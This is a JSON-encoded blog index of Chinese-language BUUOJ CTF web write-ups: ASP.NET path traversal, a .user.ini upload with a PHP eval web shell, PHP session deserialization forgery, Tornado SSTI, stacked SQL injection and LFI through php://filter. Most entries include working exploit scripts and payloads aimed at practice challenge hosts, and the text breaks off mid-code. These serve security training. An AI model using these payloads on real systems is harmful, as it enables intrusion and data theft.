&lt;/div&gt;</span><br><span class=\"line\">        &lt;/div&gt;</span><br><span class=\"line\">    </span><br><span class=\"line\">        &lt;br&gt;</span><br><span class=\"line\">        &lt;br&gt;</span><br><span class=\"line\">        &lt;div <span class=\"keyword\">class</span>=<span class=\"string\">&#x27;row justify-content-center&#x27;</span>&gt;</span><br><span class=\"line\">            &lt;h3&gt;&lt;font color=<span class=\"string\">&#x27;red&#x27;</span>&gt;&lt;% </span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">bool</span> isBad = <span class=\"literal\">false</span>;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( Request.Form[<span class=\"string\">&quot;filename&quot;</span>] != <span class=\"literal\">null</span> ) &#123;</span><br><span class=\"line\">            isBad = Request.Form[<span class=\"string\">&quot;filename&quot;</span>].Contains(<span class=\"string\">&quot;..&quot;</span>) == <span class=\"literal\">true</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (Exception ex) &#123;</span><br><span class=\"line\">        </span><br><span class=\"line\">    &#125; </span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!isBad) &#123;</span><br><span class=\"line\">            Response.Write(System.IO.File.ReadAllText(<span class=\"string\">@&quot;C:\\inetpub\\wwwroot\\&quot;</span> + Request.Form[<span class=\"string\">&quot;filename&quot;</span>]));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (Exception ex) &#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;&lt;/font&gt;&lt;/h3&gt;</span><br><span class=\"line\">        &lt;/div&gt;</span><br><span class=\"line\">    &lt;/div&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>\r\n<h1 id=\"deploy\">1. Deploy</h1>\r\n<p>非常少见的ASP.NET的题，我们先研究一下这题如何本地复现。好在就一个文件，倒也方便。</p>\r\n<p>先收集一下信息，根据返回头，发现用的是IIS 10和ASP.NET 4.0。IIS 10跟着的是Windows Server 2016。那我们就搭一个好了，不难，注意要选那个桌面体验，Server Core版本没桌面环境，对这道题而言纯属自找麻烦。</p>\r\n<img src=\"/2019/12/07/BUUOJ%E5%88%B7%E9%A2%98-Web-Buggy-Net/Response-Header.png\" class=\"\" title=\"返回头\">\r\n<p>VS也是必要的，Rider也行。我用VS2019了。</p>\r\n\r\n<p>注意，不能用ASP.NET Core的项目，ASP.NET Core跟ASP.NET 4差了很多，.Net Framework版本要选4.0。</p>\r\n<p>在VS里新建Web窗体，把代码粘贴过去，编译。</p>\r\n<p>下一步部署，我直接复制文件后总会有一些奇奇怪怪的问题，所以用微软推荐的Web Deploy方式部署。参考<a href=\"https://www.cnblogs.com/yelanggu/p/9046589.html\">这个</a>，一步步照做就好了。最后记得改下默认文档，要不就把新建的Web窗体重命名成default.aspx。</p>\r\n<p>然后准备远程调试，参考<a href=\"https://www.cnblogs.com/SavionZhang/p/11276816.html\">这个</a>，照做。</p>\r\n<h1 id=\"audit\">2. Audit</h1>\r\n<p>回过头看源码，核心在这里：</p>\r\n<figure class=\"highlight cs\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">bool</span> isBad = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( Request.Form[<span class=\"string\">&quot;filename&quot;</span>] != <span class=\"literal\">null</span> ) &#123;</span><br><span class=\"line\">        isBad = Request.Form[<span class=\"string\">&quot;filename&quot;</span>].Contains(<span class=\"string\">&quot;..&quot;</span>) == <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; <span class=\"keyword\">catch</span> (Exception ex) &#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!isBad) &#123;</span><br><span class=\"line\">        Response.Write(System.IO.File.ReadAllText(<span class=\"string\">@&quot;C:\\inetpub\\wwwroot\\&quot;</span> + Request.Form[<span class=\"string\">&quot;filename&quot;</span>]));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; <span class=\"keyword\">catch</span> (Exception ex) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\r\n<p>从Request.Form取filename的值，如果包含<code>..</code>则判断不过，否则在页面上显示文件内容。用<code>C:\\inetpub\\wwwroot\\</code>加上刚才的filename值拼接而成。我们的目标是C:\\FLAG.txt，但是目录在C:\\inetpub\\wwwroot，因此我们确实需要<code>..\\</code>或<code>../</code>来跳到上层目录。</p>\r\n<p>然后注意一个问题，这里它使用了try来处理异常，那么如果我们让Request.Form['filename']取值的时候发生异常，而它又实际上具有合法的值， 就可以绕过了。</p>\r\n<p>那么，我们的思路无外乎两点：</p>\r\n<ol type=\"1\">\r\n<li>从Request.Form入手，研究Request.Form的取值是否有问题</li>\r\n<li>从System.IO.File.ReadAllText入手，研究传入参数是否有问题</li>\r\n</ol>\r\n<p>先从Request.Form入手吧，System.IO.File.ReadAllText是个系统函数，应该没有太大问题。</p>\r\n<h1 id=\"request.form\">3. Request.Form</h1>\r\n<p>先看一下<a href=\"https://docs.microsoft.com/zh-cn/dotnet/api/system.web.httprequest?view=netframework-4.0\">官方文档</a>，Form是HttpRequest对象的一个属性，当请求的Content-Type为\"application/x-www-form-urlencode\"或者\"multipart/form-data\"时会被填充。</p>\r\n<p>然后似乎也没什么信息了。那我们搜一下<code>ASP.NET 4 request.form</code>，然后发现了相当有趣的结果：<a href=\"https://www.codeproject.com/Tips/297679/A-potentially-dangerous-Request-Form-value-was-det\">A potentially dangerous Request Form value was detected</a>，这篇文章说自己在提交完整HTML的代码时发生错误，然后找到了<a href=\"https://docs.microsoft.com/en-us/aspnet/whitepapers/request-validation\">这个</a>，ASP.NET 1.1和2会自动阻止任何未经编码的HTML文本提交。那么ASP.NET 4呢？我们找一下ASP.NET 4的change log，找到了<a href=\"https://docs.microsoft.com/en-us/aspnet/whitepapers/aspnet4/breaking-changes#0.1__Toc256770147\">这个</a>，ASP.NET 4开始会对所有请求进行验证。我们来验证一下。</p>\r\n<p>把源码中C#代码段改成这样：</p>\r\n<figure class=\"highlight cs\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\r\n<p>那么，有没有可能bypass？找到了<a href=\"https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/september/rare-aspnet-request-validation-bypass-using-request-encoding/\">这个</a>。</p>\r\n\n    <div id=\"aplayer-YXjWEjdy\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"444324718\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{301f80db-8086-4fe8-a2ec-fe92c88bb6e3}</p>\r\n","categories":["Writeups"],"tags":["C#","Web","BUUOJ","ASP.NET"]},{"title":"BUUOJ刷题-Web-Checkin","url":"/2019/10/24/BUUOJ%E5%88%B7%E9%A2%98-Web-Checkin/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>SUCTF 2019的Checkin。</p>\r\n<p>打开后让我们上传文件。只允许图片格式的扩展名，且不能在文件内出现<code>&lt;?</code>。如果我们强行修改扩展名，会提示<code>exif_imagetype:not image!</code>，而成功上传后返回了一些东西。 <a id=\"more\"></a> <img src=\"/2019/10/24/BUUOJ%E5%88%B7%E9%A2%98-Web-Checkin/Test-upload.png\" class=\"\" title=\"Test upload\"></p>\r\n<p>对于<code>&lt;?</code>的检测，我们可以用<code>&lt;script language='php'&gt;</code>绕过，但是这种写法在PHP7以后就废弃了。而对于exif_imagetype的检测我们把文件头写对就可以了，但是我们没法绕过扩展名。</p>\r\n<p>这个时候想到可不可以用.htaccess造一个PHP木马呢？BUUOJ平台显示不出来原平台是什么，SUCTF 2019比赛的时候用的是Nginx。上网搜了一下，找到<a href=\"https://www.php.net/manual/en/configuration.file.per-user.php\">这个</a>，.user.ini，这个是PHP用来覆盖设置全局php.ini的。关于user.ini后门，请参考<a href=\"https://wooyun.js.org/drops/user.ini文件构成的PHP后门.html\">这个</a> 。</p>\r\n<p>那么我们试一下能不能上传.ini的文件。绕过exif_imagetype，我们可以用WBMP，文件头类似于\"8a8a0a\"。具体请参考<a href=\"https://tiaonmmn.github.io/2019/05/15/Insomni-hack-teaser-2019-l33-hoster/\">这个</a>。</p>\r\n<img src=\"/2019/10/24/BUUOJ%E5%88%B7%E9%A2%98-Web-Checkin/Test-upload-ini.png\" class=\"\" title=\"Test upload ini files\">\r\n<p>那么，我们上传.user.ini，内容为auto_prepend_file=1.jpg。而1.jpg我们先假定PHP版本没有到7，用script绕过。我们上传的文件会定时删除，所以上脚本（偷个懒用burpsuite的copy as requests写的，有点糟糕）。</p>\r\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">burp0_url = <span class=\"string\">&quot;http://6cb9ce65-e9c3-4d2b-8250-1d1aea0ad498.node3.buuoj.cn:80/index.php&quot;</span></span><br><span class=\"line\">burp0_cookies = &#123;<span class=\"string\">&quot;_ga&quot;</span>: <span class=\"string\">&quot;GA1.2.955320724.1570284537&quot;</span>&#125;</span><br><span class=\"line\">burp0_headers = &#123;<span class=\"string\">&quot;Cache-Control&quot;</span>: <span class=\"string\">&quot;max-age=0&quot;</span>, <span class=\"string\">&quot;Origin&quot;</span>: <span class=\"string\">&quot;http://6cb9ce65-e9c3-4d2b-8250-1d1aea0ad498.node3.buuoj.cn&quot;</span>, <span class=\"string\">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class=\"string\">&quot;1&quot;</span>, <span class=\"string\">&quot;Content-Type&quot;</span>: <span class=\"string\">&quot;multipart/form-data; boundary=----WebKitFormBoundaryQLCUc5tPaf34BcAx&quot;</span>, <span class=\"string\">&quot;User-Agent&quot;</span>: <span class=\"string\">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36&quot;</span>, <span class=\"string\">&quot;Accept&quot;</span>: <span class=\"string\">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&quot;</span>, <span class=\"string\">&quot;Referer&quot;</span>: <span class=\"string\">&quot;http://6cb9ce65-e9c3-4d2b-8250-1d1aea0ad498.node3.buuoj.cn/&quot;</span>, <span class=\"string\">&quot;Accept-Encoding&quot;</span>: <span class=\"string\">&quot;gzip, deflate&quot;</span>, <span class=\"string\">&quot;Accept-Language&quot;</span>: <span class=\"string\">&quot;en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7&quot;</span>, <span class=\"string\">&quot;Connection&quot;</span>: <span class=\"string\">&quot;close&quot;</span>&#125;</span><br><span class=\"line\">burp0_data = <span class=\"string\">&quot;------WebKitFormBoundaryQLCUc5tPaf34BcAx\\r\\nContent-Disposition: form-data; name=\\&quot;fileUpload\\&quot;; filename=\\&quot;.user.ini\\&quot;\\r\\nContent-Type: image/jpeg\\r\\n\\r\\n\\x00\\x00\\x8a9\\x8a9\\n\\nauto_prepend_file=shell2.png\\r\\n------WebKitFormBoundaryQLCUc5tPaf34BcAx\\r\\nContent-Disposition: form-data; name=\\&quot;upload\\&quot;\\r\\n\\r\\n\\xe6\\x8f\\x90\\xe4\\xba\\xa4\\r\\n------WebKitFormBoundaryQLCUc5tPaf34BcAx--\\r\\n&quot;</span></span><br><span class=\"line\">requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)</span><br><span class=\"line\">burp0_url = <span class=\"string\">&quot;http://6cb9ce65-e9c3-4d2b-8250-1d1aea0ad498.node3.buuoj.cn:80/index.php&quot;</span></span><br><span class=\"line\">burp0_cookies = &#123;<span class=\"string\">&quot;_ga&quot;</span>: <span class=\"string\">&quot;GA1.2.955320724.1570284537&quot;</span>&#125;</span><br><span class=\"line\">burp0_headers = &#123;<span class=\"string\">&quot;Cache-Control&quot;</span>: <span class=\"string\">&quot;max-age=0&quot;</span>, <span class=\"string\">&quot;Origin&quot;</span>: <span class=\"string\">&quot;http://6cb9ce65-e9c3-4d2b-8250-1d1aea0ad498.node3.buuoj.cn&quot;</span>, <span class=\"string\">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class=\"string\">&quot;1&quot;</span>, <span class=\"string\">&quot;Content-Type&quot;</span>: <span class=\"string\">&quot;multipart/form-data; boundary=----WebKitFormBoundaryfnkiDtoqTZyrzBuQ&quot;</span>, <span class=\"string\">&quot;User-Agent&quot;</span>: <span class=\"string\">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36&quot;</span>, <span class=\"string\">&quot;Accept&quot;</span>: <span class=\"string\">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&quot;</span>, <span class=\"string\">&quot;Referer&quot;</span>: <span class=\"string\">&quot;http://6cb9ce65-e9c3-4d2b-8250-1d1aea0ad498.node3.buuoj.cn/index.php&quot;</span>, <span class=\"string\">&quot;Accept-Encoding&quot;</span>: <span class=\"string\">&quot;gzip, deflate&quot;</span>, <span class=\"string\">&quot;Accept-Language&quot;</span>: <span class=\"string\">&quot;en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7&quot;</span>, <span class=\"string\">&quot;Connection&quot;</span>: <span class=\"string\">&quot;close&quot;</span>&#125;</span><br><span class=\"line\">burp0_data = <span class=\"string\">&quot;------WebKitFormBoundaryfnkiDtoqTZyrzBuQ\\r\\nContent-Disposition: form-data; name=\\&quot;fileUpload\\&quot;; filename=\\&quot;shell2.png\\&quot;\\r\\nContent-Type: image/png\\r\\n\\r\\n\\x00\\x00\\x8a9\\x8a9\\n\\n&lt;script language=&#x27;php&#x27;&gt;eval($_POST[&#x27;cmd&#x27;]);&lt;/script&gt;\\r\\n------WebKitFormBoundaryfnkiDtoqTZyrzBuQ\\r\\nContent-Disposition: form-data; name=\\&quot;upload\\&quot;\\r\\n\\r\\n\\xe6\\x8f\\x90\\xe4\\xba\\xa4\\r\\n------WebKitFormBoundaryfnkiDtoqTZyrzBuQ--\\r\\n&quot;</span></span><br><span class=\"line\">print(requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).text)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\r\n<p>得到访问目录，然后直接POST传包就可以了。</p>\r\n<img src=\"/2019/10/24/BUUOJ%E5%88%B7%E9%A2%98-Web-Checkin/Get-shell.png\" class=\"\" title=\"Get shell\">\r\n\n    <div id=\"aplayer-rBUyYMKL\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"21274655\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{5f75c6f5-851f-4a39-8335-8901d13bbf84}</p>\r\n","categories":["Writeups"],"tags":["PHP","BUUOJ",".user.ini","Upload"]},{"title":"BUUOJ刷题-Web-Easy Notes","url":"/2019/09/07/BUUOJ%E5%88%B7%E9%A2%98-Web-Easy-Notes/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>HarekazeCTF 2019的Easy Notes。 <a id=\"more\"></a> 先把源码脱下来。index.php没有LFI。pages/flag.php要求is_admin()成功后显示flag。is_admin()在lib.php中： <figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">is_admin</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (!<span class=\"keyword\">isset</span>($_SESSION[<span class=\"string\">&#x27;admin&#x27;</span>])) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> $_SESSION[<span class=\"string\">&#x27;admin&#x27;</span>] === <span class=\"literal\">true</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\r\n<p>要求SESSION验证，那我们来看一下SESSION处理的相关代码。init.php中出现session_save_path为\"/var/www/tmp/\"。然后全部代码再没有提过$_SESSION['admin']了，同时也没有数据库的参与。那就要考虑一下Session反序列化的问题了。</p>\r\n<p>接着看代码，在用户登录以后可以添加Notes，以及Export。添加Notes，会把相关数据写到Session里。Export的时候可以选择Tar或者Zip，如果指定为Tar会使用Phar进行压缩，否则就会使用Zip。注意type是可以通过GET传递的，那么如果type设为<code>.</code>，就会连同前面的<code>.</code>一起被删除。那么文件就变成了sess_-(随机数字)，保存在/var/www/tmp下。</p>\r\n<p>PHP使用文件存储Session信息，并且。因此如果我们把Session文件替换了，写入admin信息，那么Flag就会出来了。PHP的Session文件以\"sess_\"开头，后接Session ID，Session ID仅有[A-Za-z0-9-0]构成。Ubuntu默认安装的PHP中session.serialize_handler默认设置为php。这种情况下，Session文件的内容为(属性名)|(序列化数据)。在访问Session数据的时候，PHP会自动反序列化相应数据。那么，我们构造Note的标题名为\"|N;admin|b:1;\"。这样反序列化的结果就是admin==bool(true)。我们就伪造了admin身份。而我们访问的时候，通过传递Cookie的值PHPSESSID为我们想要的Session ID，PHP就会去反序列化相应的Session文件。</p>\r\n<p>那么，攻击流程如下：</p>\r\n<pre><code>1. 注册一个用户，名为&quot;sess\\_&quot;\r\n\r\n2. 添加一个Note，标题为&quot;|N;admin|b:1;&quot;，内容任意\r\n\r\n3. 访问&quot;export.php?type=.&quot;，将我们想要的反序列化数据写入Session文件，返回的页面中会出现文件名\r\n\r\n4. 带上刚才的PHPSESSID Cookie访问/?page=flag获取flag。</code></pre>\r\n<p>脚本如下： <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">  <span class=\"keyword\">import</span> re</span><br><span class=\"line\">  <span class=\"keyword\">import</span> requests</span><br><span class=\"line\">  URL = <span class=\"string\">&#x27;http://(target)/&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">  <span class=\"comment\"># login as sess_</span></span><br><span class=\"line\">  sess = requests.Session()</span><br><span class=\"line\">  sess.post(URL + <span class=\"string\">&#x27;login.php&#x27;</span>, data=&#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;user&#x27;</span>: <span class=\"string\">&#x27;sess_&#x27;</span></span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\"># make a crafted note</span></span><br><span class=\"line\">  sess.post(URL + <span class=\"string\">&#x27;add.php&#x27;</span>, data=&#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;title&#x27;</span>: <span class=\"string\">&#x27;|N;admin|b:1;&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;body&#x27;</span>: <span class=\"string\">&#x27;hello&#x27;</span></span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\"># make a fake session</span></span><br><span class=\"line\">  r = sess.get(URL + <span class=\"string\">&#x27;export.php?type=.&#x27;</span>).headers[<span class=\"string\">&#x27;Content-Disposition&#x27;</span>]</span><br><span class=\"line\">  sessid = re.findall(<span class=\"string\">r&#x27;sess_([0-9a-z-]+)&#x27;</span>, r)[<span class=\"number\">0</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\"># get the flag</span></span><br><span class=\"line\">  r = requests.get(URL + <span class=\"string\">&#x27;?page=flag&#x27;</span>, cookies=&#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;PHPSESSID&#x27;</span>: sessid</span><br><span class=\"line\">  &#125;).content.decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">  flag = re.findall(<span class=\"string\">r&#x27;flag\\&#123;.+\\&#125;&#x27;</span>, r)</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> len(flag) &gt; <span class=\"number\">0</span>:</span><br><span class=\"line\">    print(flag[<span class=\"number\">0</span>])</span><br><span class=\"line\">    <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure></p>\r\n\n    <div id=\"aplayer-itsvdpFh\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"438554\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{d1bdac0f-d30d-4998-a79d-f9b7d4bac14f}</p>\r\n","categories":["Writeups"],"tags":["Unserialize","PHP","Web","BUUOJ","Session"]},{"title":"BUUOJ刷题-Web-Easy_Tornado","url":"/2019/08/28/BUUOJ%E5%88%B7%E9%A2%98-Web-Easy-Tornado/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>2018护网杯 Easy Tornado。</p>\r\n<p>打开后给了三个链接。/flag.txt提示flag在/fllllllllllllag这里。/welcome.txt提示render。/hints.txt提示md5(cookie_secret+md5(filename))。</p>\r\n<p>这三个链接的URL类似，形如file?filename=/hints.txt&amp;filehash=02349af91320adb103fb59e50a5f580a，那么合理猜测filehash的算法应该就是hints.txt里提到的东西了。我们随意修改filename，会发现转到了error?msg=Error。 <a id=\"more\"></a> 问题在于，为什么error页面需要一个msg参数？我们随意改一下msg，发现显示内容也随之改变。那么这里就是一个SSTI了。</p>\r\n<p>下一步是拿到cookie_secret，我们试一下SSTI读文件。发现读不了，过滤了相当多的字符。那么试一下读Context吧。我们已知平台后端是Tornado框架，翻<a href=\"https://tornado.readthedocs.io/en/latest/guide/templates.html#template-syntax\">文档</a>，发现在模板里有一个handler指向当前RequestHandler，那么再根据<a href=\"https://www.tornadoweb.org/en/stable/web.html?highlight=handler%20setting#tornado.web.Application.settings\">这个</a>，我们就可以拿到settings了。</p>\r\n<p>提交error?msg=，返回页面里出现了cookie_secret，那么我们就可以手动计算flag文件的hash了。</p>\r\n\n    <div id=\"aplayer-gzUCpRjw\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"37853739\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{0b52d4e0-0c3b-4734-8bcb-d208b026336b}</p>\r\n","categories":["Writeups"],"tags":["Web","BUUOJ","Python","Tornado","SSTI"]},{"title":"BUUOJ刷题-Web-EasySQL","url":"/2020/07/24/BUUOJ%E5%88%B7%E9%A2%98-Web-EasySQL/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>SUCTF 2019 EasySQL。</p>\r\n<p>确实Easy，Fuzz一下，报错无提示，不准出现union flag prepare等东西。突发奇想试了下;发现可行。1;show databases;返回结果了，那么堆叠注入吧。然而不能prepare任意执行。还得猜语句。</p>\r\n<p>随手输个1，发现返回结果，而输0和字母的时候就不返回了。不能任意执行语句，那么flag要在语句中出现，大胆猜测语句为select $_POST['query']||flag from **。那么，直接输入*,1，会导致SQL语句变成select *,1||flag from **，||仍为or的作用，表中数据全部带出来。</p>\r\n<p>因为输入任何字母会无返回，猜到的有||，因为有字母的时候会当成列名处理，从而语句不合法。</p>\r\n<p>所以，让||不再当or的作用可解决这个问题，即变成select aa||flag from **==select aaflag from **。MySQL有个sql_mode可以控制||的行为，为pipes_as_concat时可以使||成为字符串连接符。所以我们的提交要变成select 1;set sql_mode=pipes_as_concat;select 1，SQL语句变成select 1;set sql_mode=pipes_as_concat;select 1||flag from **，合法的语句。这样就可以 带出flag。</p>\r\n\n    <div id=\"aplayer-UWYWnlkQ\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"26113988\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{fec33ca7-9bad-492d-985b-c143d31b7260}</p>\r\n","categories":["Writeups"],"tags":["PHP","Web","SQL注入","sql_mode"]},{"title":"BUUOJ刷题-Web-Eating-CMS","url":"/2020/04/07/BUUOJ%E5%88%B7%E9%A2%98-Web-Eating-CMS/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>N1CTF 2018的Eating_CMS。</p>\r\n<p>打开是个登录页面，登陆的时候会显示SQL语句。猜测有register.php，果然有，注册后登陆，显示新的页面。注意到URL为http://0008abbc-5e70-4d41-b1d7-7d161114c40b.node3.buuoj.cn/user.php?page=guest，试下LFI。user.php?page=/var/www/html/guest，发现可以正常访问，LFI没跑了。试下PHP Filter：user.php?page=php://filter/convert.base64-encode/resource=index，得到index.php的源码，然后扒下来已知文件。</p>\r\n<figure class=\"highlight php\"><figcaption><span>index.php</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">require_once</span> <span class=\"string\">&quot;function.php&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_SESSION[<span class=\"string\">&#x27;login&#x27;</span>] ))&#123;</span><br><span class=\"line\">    Header(<span class=\"string\">&quot;Location: user.php?page=info&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">include</span> <span class=\"string\">&quot;templates/index.html&quot;</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\r\n<figure class=\"highlight php\"><figcaption><span>function.php</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">session_start();</span><br><span class=\"line\"><span class=\"keyword\">require_once</span> <span class=\"string\">&quot;config.php&quot;</span>;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Hacker</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    Header(<span class=\"string\">&quot;Location: hacker.php&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">die</span>();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">filter_directory</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    $keywords = [<span class=\"string\">&quot;flag&quot;</span>,<span class=\"string\">&quot;manage&quot;</span>,<span class=\"string\">&quot;ffffllllaaaaggg&quot;</span>];</span><br><span class=\"line\">    $uri = parse_url($_SERVER[<span class=\"string\">&quot;REQUEST_URI&quot;</span>]);</span><br><span class=\"line\">    parse_str($uri[<span class=\"string\">&#x27;query&#x27;</span>], $query);</span><br><span class=\"line\"><span class=\"comment\">//    var_dump($query);</span></span><br><span class=\"line\"><span class=\"comment\">//    die();</span></span><br><span class=\"line\">    <span class=\"keyword\">foreach</span>($keywords <span class=\"keyword\">as</span> $token)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span>($query <span class=\"keyword\">as</span> $k =&gt; $v)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (stristr($k, $token))</span><br><span class=\"line\">                hacker();</span><br><span class=\"line\">            